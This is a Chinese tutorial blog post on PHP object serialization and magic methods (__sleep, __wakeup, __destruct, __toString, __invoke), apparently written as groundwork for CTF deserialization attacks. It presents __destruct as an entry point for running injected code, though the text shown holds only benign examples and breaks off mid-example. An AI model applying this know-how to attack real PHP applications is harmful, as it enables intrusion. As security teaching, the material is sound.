<h4 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h4><p>所有PHP里面的值都可以使用函数<code>serialize()</code>来返回一个包含字节流的字符串来表示.<code>unserialize()</code>函数能够重新把字符串变回PHP原来的值. 序列化一个对象将会保存对象的所有变量,但不会保存对象的方法,只会保存类的名字.</p>
<p>对象序列化 <code>serialize</code>方法,返回字符串,此字符串包含了表示value的字节流,可以存储于任何地方,有利于存储或传递PHP的值,同时不丢失其类型和结构.</p>
<p>对象反序列化 <code>unserialize</code>方法,对单一的已序列化的变量进行操作,将其转换回PHP值.</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 字符串和数字都可以序列化/反序列化</li>
</ul>
<h2 id="第二节-php的序列化与反序列化"><a href="#第二节-php的序列化与反序列化" class="headerlink" title="第二节 php的序列化与反序列化"></a>第二节 php的序列化与反序列化</h2><h3 id="0x3-序列化与反序列化"><a href="#0x3-序列化与反序列化" class="headerlink" title="0x3 序列化与反序列化"></a>0x3 序列化与反序列化</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>序列化的本质是将内存中的对象,转换为可以保存,传输的字符</p>
<p>在php中,我们不仅可以序列化对象的实例,也可以序列化一些基本类型</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;charmersix&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$name</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以得到序列化字符串</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210031520075.png" alt="image-20221002180711339"></p>
<p>其中第一个s表示被序列化的对象类型,s指string</p>
<p>后面紧跟一个冒号和数字,表示属性的长度,后面冒号+双引号表示属性的内容</p>
<p>我们也可以尝试序列化一个我们自定义的类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到一个对象被序列化以后的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>一个对象，名字是6个字符，内容是Animal，有一个属性，是个字符串，名字由4个字符组成，是name，没有值，是Null</p>
<p>属性是有权限的，当属性权限为<code>protected</code>时,可以看到序列化结果为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*name&quot;</span>;N;&#125;</span><br><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Animal%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>属性名字前加了*表示这个属性是<code>protected</code>权限,其实这里还有不可见字符,可以看到长度是7</p>
<p>那么增加的不可见字符是什么呢,就是<code>\x00*\x00</code>,三个字符加上name的4个字符,刚好是7字符,可以通过<code>urlencode</code>发现不可见字符,所以遇到非public属性进行序列化时,一定不要直接复制输出,除非进行了<code>urlencode</code>编码</p>
<p>如果是私有属性反序列化后是类名+属性</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">12</span>:<span class="string">&quot;Animalname&quot;</span>;N;&#125;</span><br><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Animal%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Animal%<span class="number">00</span>name%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>可以看到我们虽然序列化的是子类,但是会把父类的私有属性也序列化进去,甚至可以吧<code>trait</code>看成一种特殊的继承类,也会被序列化进去</p>
<p>抽象类和接口都无法序列化,但是匿名类可以序列化</p>
<p>对象的属性也可以为对象</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">action</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">action</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; <span class="keyword">new</span> = <span class="variable">$h</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>这时候，序列化后的字符串为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;new&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;Human&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;gender&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;move&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;step&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>一个对象,名字是6个字符,内容是Animal,有1个属性,属性名字是字符串,长度为4,内容name,值是一个对象,对象名字是5个字符,内容是Human,包含三个属性,分别是6个字符的gender,4个字符的name,以及4个字符的move</p>
<p>总结:</p>
<p>序列化就是对一个对象的所有属性,用字符串描述出来,方便反序列化时还原</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>反序列化是对已经序列化后的字符串,重新构造出一个对象使用<code>unserialize</code></p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="comment">//echo serialize ($a);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//得到序列化以后的结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&#x27;O:6:&quot;Animal&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$panda</span> = <span class="title function_ invoke__">unserialize</span> (<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$panda</span> -&gt;name;</span><br></pre></td></tr></table></figure>

<p>可以看到输出了一个<code>panda</code></p>
<p>php对于不识别的类被反序列化后,会给自动分配一个类名,这个类名就是<code>__PHP_Incomplete_Class</code></p>
<p>总结:</p>
<ol>
<li>反序列化时,必须反序列化已经存在的类</li>
<li><code>unserialize</code>函数的参数,必须是字符串</li>
<li><code>unserialize</code>函数返回的是转换之后的值,可为integer、float、string、array、或object，如果传递的字符串不可解序列化，则返回false</li>
</ol>
<p>这里说的存在的类，是指在PHP脚本或所包含的文件中，有class关键字定义的类</p>
<h3 id="0x4-PHP中的魔术方法"><a href="#0x4-PHP中的魔术方法" class="headerlink" title="0x4 PHP中的魔术方法"></a>0x4 PHP中的魔术方法</h3><p>在php中，存在众多的魔法方法，是每个对象默认都有的方法，不管定义不定义，都会存在</p>
<h4 id="sleep和wakeup方法"><a href="#sleep和wakeup方法" class="headerlink" title="sleep和wakeup方法"></a>sleep和wakeup方法</h4><p>魔法方法是以两个下划线开头的方法</p>
<p>其中<code>__sleep</code>方法是序列化的时候，自动调用的方法</p>
<p><code>serialize()</code>函数会检查类中是否存在一个魔术方法<code>__sleep()</code>如果存在,该方法会被调用,然后才执行序列化操作.此功能可以用于清理对象,并返回一个包含对象中所有应被序列化的变量名称数组.</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span> (<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>打印结果为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Animal&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;panda&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;color&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;red&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//序列化后只有name和color</span></span><br></pre></td></tr></table></figure>

<p>同构<code>__sleep</code>方法清理后,<code>move</code>属性并没有进入序列化后的结果和<code>__sleep</code>方法对应的是<code>wakeup</code>方法,表示反序列化时,对所反序列化的属性进行处理<code>wakeup</code>函数可以不需要返回值,时对对象的属性进行一些初始化操作</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span> -&gt; name = <span class="string">&quot;tiger&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $a = new Animal();</span></span><br><span class="line"><span class="comment">// echo serialize ($a);</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;O:6:&quot;Animal&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:5:&quot;color&quot;;s:3:&quot;red&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> -&gt; name;</span><br></pre></td></tr></table></figure>

<p>可以看到,我们这里反序列化的属性值,不管是不是panda,最终反序列化后,都变成了tiger,所以wakeup方法会在反序列化前被调用,用来提前处理属性的值</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210031935656.png" alt="image-20221003193513620"></p>
<h4 id="construct和destruct方法"><a href="#construct和destruct方法" class="headerlink" title="construct和destruct方法"></a>construct和destruct方法</h4><p>和上面方法类似,这里成为构造函数和析构函数</p>
<p>表示对象在实例化时执行的函数和对象要销毁前执行的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;panda&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$move</span> = <span class="string">&quot;step&quot;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can eat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i can sleep&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;color&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span> -&gt; name = <span class="string">&quot;tiger&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;对象被new时执行&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;对象被销毁时执行&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br></pre></td></tr></table></figure>

<p>也就是说,在PHP代码中,实例化一个对象的时候,会自动调用类的<code>__construct</code>方法,当前php脚本即将运行结束,就会调用已经实例化的类的<code>__destruct</code>方法 所以上面的栗子会先调用前者,再调用后者.</p>
<p>但是,如果单纯的进行反序列化,不实例化对象时,只会调用<code>__destruct</code>方法</p>
<p>这里会是一个明显的调用入口,如果我们反序列化一个拥有<code>__destruct</code>方法的对象时,会自动调用这个析构方法,而如果这个析构方法中,有我们可以控制的值,那么就可以实现我们恶意代码内容</p>
<p>在php反序列化利用，析构方法是很好的入手点，但是我们可能不一定能够找到非常合适的析构方法供我们使用</p>
<h4 id="call和callStatic方法"><a href="#call和callStatic方法" class="headerlink" title="call和callStatic方法"></a>call和callStatic方法</h4><p>在对象中调用一个不可访问的方法时，<code>__call()</code>会被调用</p>
<p>在静态上下文中调用一个不可访问的方法时, <code>__callStatic()</code>会被调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i called method&quot;</span>.<span class="variable">$name</span>. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;args is &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cs</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$cs</span>-&gt;<span class="title function_ invoke__">go</span>(<span class="number">1</span>, <span class="string">&quot;CT&quot;</span>,<span class="string">&quot;m4a1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="get、set和isset、unset"><a href="#get、set和isset、unset" class="headerlink" title="get、set和isset、unset"></a>get、set和isset、unset</h4><ul>
<li>在给不可访问属性赋值时,<code>__set()</code>会被调用.</li>
<li>读取不可访问属性的值时,<code>__get()</code>会被调用.</li>
<li>当对不可访问属性调用<code>isset()</code>或<code>empty()</code>时,<code>__isset()</code>会被调用.</li>
<li>当对不可访问属性调用<code>unset()</code>时,<code>__unset()</code>会被调用.</li>
</ul>
<h4 id="tostring方法"><a href="#tostring方法" class="headerlink" title="tostring方法"></a>tostring方法</h4><p><code>__toString()</code>方法用于一个类被当成字符串时应怎样回应.例如<code>echo $obj;</code>应该显示些什么.此方法必须返回一个字符串,否则将发出一条<code>E_RECOVERABLE_ERROR</code>级别的致命错误.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&quot;you never know my secret&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hey <span class="subst">$name</span>!&quot;</span>.<span class="variable language_">$this</span>-&gt;secret ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//相当于执行</span></span><br><span class="line"><span class="comment">//echo $c-&gt;__toString();</span></span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you never know my secret</span><br></pre></td></tr></table></figure>

<p>这里直接打印对象实例,会自动调用对象的<code>__toString</code>方法,这里方法名字大小写不敏感</p>
<h4 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h4><p>当尝试以调用函数的方式调用一个对象时<code>__invoke()</code>方法会被自动调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$secret</span> = <span class="string">&quot;you never know my secret&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hey <span class="subst">$name</span>!&quot;</span>.<span class="variable language_">$this</span> -&gt; secret;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">show</span>(<span class="variable">$name</span>);</span><br><span class="line">  &#125;</span><br><span 